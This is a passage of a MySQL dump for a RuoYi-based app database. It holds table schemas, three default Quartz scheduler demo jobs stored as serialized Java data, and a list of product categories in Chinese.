-- MySQL dump 10.13  Distrib 8.0.26, for Win64 (x86_64)
--
-- Host: 152.136.113.191    Database: ry
-- ------------------------------------------------------
-- Server version	5.7.34-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `HistoricalRecord`
--

DROP TABLE IF EXISTS `HistoricalRecord`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `HistoricalRecord` (
  `openId` int(11) NOT NULL,
  `machineId` int(11) NOT NULL,
  `weight` int(11) NOT NULL,
  `date` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `HistoricalRecord`
--

LOCK TABLES `HistoricalRecord` WRITE;
/*!40000 ALTER TABLE `HistoricalRecord` DISABLE KEYS */;
/*!40000 ALTER TABLE `HistoricalRecord` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `Points`
--

DROP TABLE IF EXISTS `Points`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `Points` (
  `openId` varchar(30) NOT NULL,
  `points` int(11) NOT NULL,
  `weight` double NOT NULL,
  `type` int(11) NOT NULL,
  `machineId` int(11) NOT NULL,
  `date` datetime NOT NULL,
  `address` varchar(30) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `Points`
--

LOCK TABLES `Points` WRITE;
/*!40000 ALTER TABLE `Points` DISABLE KEYS */;
/*!40000 ALTER TABLE `Points` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_BLOB_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_BLOB_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_BLOB_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `blob_data` blob,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `QRTZ_BLOB_TRIGGERS_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_BLOB_TRIGGERS`
--

LOCK TABLES `QRTZ_BLOB_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_BLOB_TRIGGERS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_BLOB_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_CALENDARS`
--

DROP TABLE IF EXISTS `QRTZ_CALENDARS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_CALENDARS` (
  `sched_name` varchar(120) NOT NULL,
  `calendar_name` varchar(200) NOT NULL,
  `calendar` blob NOT NULL,
  PRIMARY KEY (`sched_name`,`calendar_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_CALENDARS`
--

LOCK TABLES `QRTZ_CALENDARS` WRITE;
/*!40000 ALTER TABLE `QRTZ_CALENDARS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_CALENDARS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_CRON_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_CRON_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_CRON_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `cron_expression` varchar(200) NOT NULL,
  `time_zone_id` varchar(80) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `QRTZ_CRON_TRIGGERS_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_CRON_TRIGGERS`
--

LOCK TABLES `QRTZ_CRON_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_CRON_TRIGGERS` DISABLE KEYS */;
INSERT INTO `QRTZ_CRON_TRIGGERS` VALUES ('RuoyiScheduler','TASK_CLASS_NAME1','DEFAULT','0/10 * * * * ?','Asia/Shanghai'),('RuoyiScheduler','TASK_CLASS_NAME2','DEFAULT','0/15 * * * * ?','Asia/Shanghai'),('RuoyiScheduler','TASK_CLASS_NAME3','DEFAULT','0/20 * * * * ?','Asia/Shanghai');
/*!40000 ALTER TABLE `QRTZ_CRON_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_FIRED_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_FIRED_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_FIRED_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `entry_id` varchar(95) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `instance_name` varchar(200) NOT NULL,
  `fired_time` bigint(13) NOT NULL,
  `sched_time` bigint(13) NOT NULL,
  `priority` int(11) NOT NULL,
  `state` varchar(16) NOT NULL,
  `job_name` varchar(200) DEFAULT NULL,
  `job_group` varchar(200) DEFAULT NULL,
  `is_nonconcurrent` varchar(1) DEFAULT NULL,
  `requests_recovery` varchar(1) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`entry_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_FIRED_TRIGGERS`
--

LOCK TABLES `QRTZ_FIRED_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_FIRED_TRIGGERS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_FIRED_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_JOB_DETAILS`
--

DROP TABLE IF EXISTS `QRTZ_JOB_DETAILS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_JOB_DETAILS` (
  `sched_name` varchar(120) NOT NULL,
  `job_name` varchar(200) NOT NULL,
  `job_group` varchar(200) NOT NULL,
  `description` varchar(250) DEFAULT NULL,
  `job_class_name` varchar(250) NOT NULL,
  `is_durable` varchar(1) NOT NULL,
  `is_nonconcurrent` varchar(1) NOT NULL,
  `is_update_data` varchar(1) NOT NULL,
  `requests_recovery` varchar(1) NOT NULL,
  `job_data` blob,
  PRIMARY KEY (`sched_name`,`job_name`,`job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_JOB_DETAILS`
--

LOCK TABLES `QRTZ_JOB_DETAILS` WRITE;
/*!40000 ALTER TABLE `QRTZ_JOB_DETAILS` DISABLE KEYS */;
INSERT INTO `QRTZ_JOB_DETAILS` VALUES ('RuoyiScheduler','TASK_CLASS_NAME1','DEFAULT',NULL,'com.ruoyi.project.monitor.job.util.QuartzDisallowConcurrentExecution','0','1','0','0',_binary '�\�\0sr\0org.quartz.JobDataMap���迩�\�\0\0xr\0&org.quartz.utils.StringKeyDirtyFlagMap�\�\��\�](\0Z\0allowsTransientDataxr\0org.quartz.utils.DirtyFlagMap\�.�(v\n\�\0Z\0dirtyL\0mapt\0Ljava/util/Map;xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0TASK_PROPERTIESsr\0(com.ruoyi.project.monitor.job.domain.Job\0\0\0\0\0\0\0\0L\0\nconcurrentt\0Ljava/lang/String;L\0cronExpressionq\0~\0	L\0invokeTargetq\0~\0	L\0jobGroupq\0~\0	L\0jobIdt\0Ljava/lang/Long;L\0jobNameq\0~\0	L\0\rmisfirePolicyq\0~\0	L\0statusq\0~\0	xr\0)com.ruoyi.framework.web.domain.BaseEntity\0\0\0\0\0\0\0\0L\0createByq\0~\0	L\0\ncreateTimet\0Ljava/util/Date;L\0paramsq\0~\0L\0remarkq\0~\0	L\0searchValueq\0~\0	L\0updateByq\0~\0	L\0\nupdateTimeq\0~\0xpt\0adminsr\0java.util.Datehj�KYt\0\0xpw\0\0~(�xpt\0\0pppt\01t\00/10 * * * * ?t\0ryTask.ryNoParamst\0DEFAULTsr\0java.lang.Long;�\�̏#\�\0J\0valuexr\0java.lang.Number����\��\0\0xp\0\0\0\0\0\0\0t\0系统默认（无参）t\03t\01x\0'),('RuoyiScheduler','TASK_CLASS_NAME2','DEFAULT',NULL,'com.ruoyi.project.monitor.job.util.QuartzDisallowConcurrentExecution','0','1','0','0',_binary '�\�\0sr\0org.quartz.JobDataMap���迩�\�\0\0xr\0&org.quartz.utils.StringKeyDirtyFlagMap�\�\��\�](\0Z\0allowsTransientDataxr\0org.quartz.utils.DirtyFlagMap\�.�(v\n\�\0Z\0dirtyL\0mapt\0Ljava/util/Map;xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0TASK_PROPERTIESsr\0(com.ruoyi.project.monitor.job.domain.Job\0\0\0\0\0\0\0\0L\0\nconcurrentt\0Ljava/lang/String;L\0cronExpressionq\0~\0	L\0invokeTargetq\0~\0	L\0jobGroupq\0~\0	L\0jobIdt\0Ljava/lang/Long;L\0jobNameq\0~\0	L\0\rmisfirePolicyq\0~\0	L\0statusq\0~\0	xr\0)com.ruoyi.framework.web.domain.BaseEntity\0\0\0\0\0\0\0\0L\0createByq\0~\0	L\0\ncreateTimet\0Ljava/util/Date;L\0paramsq\0~\0L\0remarkq\0~\0	L\0searchValueq\0~\0	L\0updateByq\0~\0	L\0\nupdateTimeq\0~\0xpt\0adminsr\0java.util.Datehj�KYt\0\0xpw\0\0~(�xpt\0\0pppt\01t\00/15 * * * * ?t\0ryTask.ryParams(\'ry\')t\0DEFAULTsr\0java.lang.Long;�\�̏#\�\0J\0valuexr\0java.lang.Number����\��\0\0xp\0\0\0\0\0\0\0t\0系统默认（有参）t\03t\01x\0'),('RuoyiScheduler','TASK_CLASS_NAME3','DEFAULT',NULL,'com.ruoyi.project.monitor.job.util.QuartzDisallowConcurrentExecution','0','1','0','0',_binary '�\�\0sr\0org.quartz.JobDataMap���迩�\�\0\0xr\0&org.quartz.utils.StringKeyDirtyFlagMap�\�\��\�](\0Z\0allowsTransientDataxr\0org.quartz.utils.DirtyFlagMap\�.�(v\n\�\0Z\0dirtyL\0mapt\0Ljava/util/Map;xpsr\0java.util.HashMap\��\�`\�\0F\0\nloadFactorI\0	thresholdxp?@\0\0\0\0\0w\0\0\0\0\0\0t\0TASK_PROPERTIESsr\0(com.ruoyi.project.monitor.job.domain.Job\0\0\0\0\0\0\0\0L\0\nconcurrentt\0Ljava/lang/String;L\0cronExpressionq\0~\0	L\0invokeTargetq\0~\0	L\0jobGroupq\0~\0	L\0jobIdt\0Ljava/lang/Long;L\0jobNameq\0~\0	L\0\rmisfirePolicyq\0~\0	L\0statusq\0~\0	xr\0)com.ruoyi.framework.web.domain.BaseEntity\0\0\0\0\0\0\0\0L\0createByq\0~\0	L\0\ncreateTimet\0Ljava/util/Date;L\0paramsq\0~\0L\0remarkq\0~\0	L\0searchValueq\0~\0	L\0updateByq\0~\0	L\0\nupdateTimeq\0~\0xpt\0adminsr\0java.util.Datehj�KYt\0\0xpw\0\0~(�xpt\0\0pppt\01t\00/20 * * * * ?t\08ryTask.ryMultipleParams(\'ry\', true, 2000L, 316.50D, 100)t\0DEFAULTsr\0java.lang.Long;�\�̏#\�\0J\0valuexr\0java.lang.Number����\��\0\0xp\0\0\0\0\0\0\0t\0系统默认（多参）t\03t\01x\0');
/*!40000 ALTER TABLE `QRTZ_JOB_DETAILS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_LOCKS`
--

DROP TABLE IF EXISTS `QRTZ_LOCKS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_LOCKS` (
  `sched_name` varchar(120) NOT NULL,
  `lock_name` varchar(40) NOT NULL,
  PRIMARY KEY (`sched_name`,`lock_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_LOCKS`
--

LOCK TABLES `QRTZ_LOCKS` WRITE;
/*!40000 ALTER TABLE `QRTZ_LOCKS` DISABLE KEYS */;
INSERT INTO `QRTZ_LOCKS` VALUES ('RuoyiScheduler','STATE_ACCESS'),('RuoyiScheduler','TRIGGER_ACCESS');
/*!40000 ALTER TABLE `QRTZ_LOCKS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_PAUSED_TRIGGER_GRPS`
--

DROP TABLE IF EXISTS `QRTZ_PAUSED_TRIGGER_GRPS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_PAUSED_TRIGGER_GRPS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  PRIMARY KEY (`sched_name`,`trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_PAUSED_TRIGGER_GRPS`
--

LOCK TABLES `QRTZ_PAUSED_TRIGGER_GRPS` WRITE;
/*!40000 ALTER TABLE `QRTZ_PAUSED_TRIGGER_GRPS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_PAUSED_TRIGGER_GRPS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_SCHEDULER_STATE`
--

DROP TABLE IF EXISTS `QRTZ_SCHEDULER_STATE`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_SCHEDULER_STATE` (
  `sched_name` varchar(120) NOT NULL,
  `instance_name` varchar(200) NOT NULL,
  `last_checkin_time` bigint(13) NOT NULL,
  `checkin_interval` bigint(13) NOT NULL,
  PRIMARY KEY (`sched_name`,`instance_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_SCHEDULER_STATE`
--

LOCK TABLES `QRTZ_SCHEDULER_STATE` WRITE;
/*!40000 ALTER TABLE `QRTZ_SCHEDULER_STATE` DISABLE KEYS */;
INSERT INTO `QRTZ_SCHEDULER_STATE` VALUES ('RuoyiScheduler','VM-8-2-centos1649082150333',1649083871359,15000);
/*!40000 ALTER TABLE `QRTZ_SCHEDULER_STATE` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_SIMPLE_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_SIMPLE_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_SIMPLE_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `repeat_count` bigint(7) NOT NULL,
  `repeat_interval` bigint(12) NOT NULL,
  `times_triggered` bigint(10) NOT NULL,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `QRTZ_SIMPLE_TRIGGERS_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_SIMPLE_TRIGGERS`
--

LOCK TABLES `QRTZ_SIMPLE_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_SIMPLE_TRIGGERS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_SIMPLE_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_SIMPROP_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_SIMPROP_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_SIMPROP_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `str_prop_1` varchar(512) DEFAULT NULL,
  `str_prop_2` varchar(512) DEFAULT NULL,
  `str_prop_3` varchar(512) DEFAULT NULL,
  `int_prop_1` int(11) DEFAULT NULL,
  `int_prop_2` int(11) DEFAULT NULL,
  `long_prop_1` bigint(20) DEFAULT NULL,
  `long_prop_2` bigint(20) DEFAULT NULL,
  `dec_prop_1` decimal(13,4) DEFAULT NULL,
  `dec_prop_2` decimal(13,4) DEFAULT NULL,
  `bool_prop_1` varchar(1) DEFAULT NULL,
  `bool_prop_2` varchar(1) DEFAULT NULL,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `QRTZ_SIMPROP_TRIGGERS_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_SIMPROP_TRIGGERS`
--

LOCK TABLES `QRTZ_SIMPROP_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_SIMPROP_TRIGGERS` DISABLE KEYS */;
/*!40000 ALTER TABLE `QRTZ_SIMPROP_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `QRTZ_TRIGGERS`
--

DROP TABLE IF EXISTS `QRTZ_TRIGGERS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `QRTZ_TRIGGERS` (
  `sched_name` varchar(120) NOT NULL,
  `trigger_name` varchar(200) NOT NULL,
  `trigger_group` varchar(200) NOT NULL,
  `job_name` varchar(200) NOT NULL,
  `job_group` varchar(200) NOT NULL,
  `description` varchar(250) DEFAULT NULL,
  `next_fire_time` bigint(13) DEFAULT NULL,
  `prev_fire_time` bigint(13) DEFAULT NULL,
  `priority` int(11) DEFAULT NULL,
  `trigger_state` varchar(16) NOT NULL,
  `trigger_type` varchar(8) NOT NULL,
  `start_time` bigint(13) NOT NULL,
  `end_time` bigint(13) DEFAULT NULL,
  `calendar_name` varchar(200) DEFAULT NULL,
  `misfire_instr` smallint(2) DEFAULT NULL,
  `job_data` blob,
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  KEY `sched_name` (`sched_name`,`job_name`,`job_group`),
  CONSTRAINT `QRTZ_TRIGGERS_ibfk_1` FOREIGN KEY (`sched_name`, `job_name`, `job_group`) REFERENCES `QRTZ_JOB_DETAILS` (`sched_name`, `job_name`, `job_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `QRTZ_TRIGGERS`
--

LOCK TABLES `QRTZ_TRIGGERS` WRITE;
/*!40000 ALTER TABLE `QRTZ_TRIGGERS` DISABLE KEYS */;
INSERT INTO `QRTZ_TRIGGERS` VALUES ('RuoyiScheduler','TASK_CLASS_NAME1','DEFAULT','TASK_CLASS_NAME1','DEFAULT',NULL,1649082160000,-1,5,'PAUSED','CRON',1649082152000,0,NULL,2,''),('RuoyiScheduler','TASK_CLASS_NAME2','DEFAULT','TASK_CLASS_NAME2','DEFAULT',NULL,1649082165000,-1,5,'PAUSED','CRON',1649082153000,0,NULL,2,''),('RuoyiScheduler','TASK_CLASS_NAME3','DEFAULT','TASK_CLASS_NAME3','DEFAULT',NULL,1649082160000,-1,5,'PAUSED','CRON',1649082153000,0,NULL,2,'');
/*!40000 ALTER TABLE `QRTZ_TRIGGERS` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ShoppingCenter`
--

DROP TABLE IF EXISTS `ShoppingCenter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ShoppingCenter` (
  `goodsName` varchar(100) NOT NULL,
  `description` varchar(200) NOT NULL,
  `price` int(11) NOT NULL,
  `goodsNumber` int(11) NOT NULL,
  `img` varchar(200) NOT NULL,
  `rollingImg` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ShoppingCenter`
--

LOCK TABLES `ShoppingCenter` WRITE;
/*!40000 ALTER TABLE `ShoppingCenter` DISABLE KEYS */;
/*!40000 ALTER TABLE `ShoppingCenter` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `UserInformation`
--

DROP TABLE IF EXISTS `UserInformation`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `UserInformation` (
  `openId` varchar(30) NOT NULL,
  `nickName` varchar(30) NOT NULL,
  `avatar` varchar(100) NOT NULL,
  `sexual` int(11) NOT NULL,
  `city` varchar(11) NOT NULL,
  `province` varchar(11) NOT NULL,
  `date` datetime NOT NULL,
  PRIMARY KEY (`openId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `UserInformation`
--

LOCK TABLES `UserInformation` WRITE;
/*!40000 ALTER TABLE `UserInformation` DISABLE KEYS */;
/*!40000 ALTER TABLE `UserInformation` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `category` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `category` varchar(64) DEFAULT '' COMMENT '分类Id',
  `catename` varchar(64) DEFAULT 'DEFAULT' COMMENT '分类名字',
  `miaoshu` varchar(64) DEFAULT '' COMMENT '描述',
  `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='商品分类';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,'1','生活','','2021-09-14 03:28:21'),(2,'2','数码','','2021-09-14 03:28:31'),(3,'3','食品','','2021-09-14 03:28:41'),(4,'4','母婴','','2021-09-14 03:28:47'),(5,'5','网络资源','','2021-09-14 03:28:57'),(6,'6','电器','','2021-09-14 03:29:05'),(8,'7','游戏相关','游戏方面','2021-11-28 05:50:06');
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `demojob`
--

DROP TABLE IF EXISTS `demojob`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `demojob` (
  `job_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务ID',
  `job_name` varchar(64) NOT NULL DEFAULT '' COMMENT '任务名称',
  `job_group` varchar(64) NOT NULL DEFAULT 'DEFAULT' COMMENT '任务组名',
  `invoke_target` varchar(500) NOT NULL COMMENT '调用目标字符串',
  `cron_expression` varchar(255) DEFAULT '' COMMENT 'cron执行表达式',
  `misfire_policy` varchar(20) DEFAULT '3' COMMENT '计划执行错误策略（1立即执行 2执行一次 3放弃执行）',
  `concurrent` char(1) DEFAULT '1' COMMENT '是否并发执行（0允许 1禁止）',
  `status` char(1) DEFAULT '0' COMMENT '状态（0正常 1暂停）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT '' COMMENT '备注信息',
  PRIMARY KEY (`job_id`,`job_name`,`job_group`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='定时任务调度表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `demojob`
--

LOCK TABLES `demojob` WRITE;
/*!40000 ALTER TABLE `demojob` DISABLE KEYS */;
INSERT INTO `demojob` VALUES (1,'系统默认（无参）','DEFAULT','ryTask.ryNoParams','0/10 * * * * ?','3','1','1','admin','2021-08-11 10:39:07','',NULL,''),(2,'系统默认（有参）','DEFAULT','ryTask.ryParams(\'ry\')','0/15 * * * * ?','3','1','1','admin','2021-08-11 10:39:07','',NULL,''),(3,'系统默认（多参）','DEFAULT','ryTask.ryMultipleParams(\'ry\', true, 2000L, 316.50D, 100)','0/20 * * * * ?','3','1','1','admin','2021-08-11 10:39:07','',NULL,'');
/*!40000 ALTER TABLE `demojob` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `gen_table`
--

DROP TABLE IF EXISTS `gen_table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `gen_table` (
  `table_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_name` varchar(200) DEFAULT '' COMMENT '表名称',
  `table_comment` varchar(500) DEFAULT '' COMMENT '表描述',
  `sub_table_name` varchar(64) DEFAULT NULL COMMENT '关联子表的表名',
  `sub_table_fk_name` varchar(64) DEFAULT NULL COMMENT '子表关联的外键名',
  `class_name` varchar(100) DEFAULT '' COMMENT '实体类名称',
  `tpl_category` varchar(200) DEFAULT 'crud' COMMENT '使用的模板（crud单表操作 tree树表操作 sub主子表操作）',
  `package_name` varchar(100) DEFAULT NULL COMMENT '生成包路径',
  `module_name` varchar(30) DEFAULT NULL COMMENT '生成模块名',
  `business_name` varchar(30) DEFAULT NULL COMMENT '生成业务名',
  `function_name` varchar(50) DEFAULT NULL COMMENT '生成功能名',
  `function_author` varchar(50) DEFAULT NULL COMMENT '生成功能作者',
  `gen_type` char(1) DEFAULT '0' COMMENT '生成代码方式（0zip压缩包 1自定义路径）',
  `gen_path` varchar(200) DEFAULT '/' COMMENT '生成路径（不填默认项目路径）',
  `options` varchar(1000) DEFAULT NULL COMMENT '其它生成选项',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`table_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='代码生成业务表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `gen_table`
--

LOCK TABLES `gen_table` WRITE;
/*!40000 ALTER TABLE `gen_table` DISABLE KEYS */;
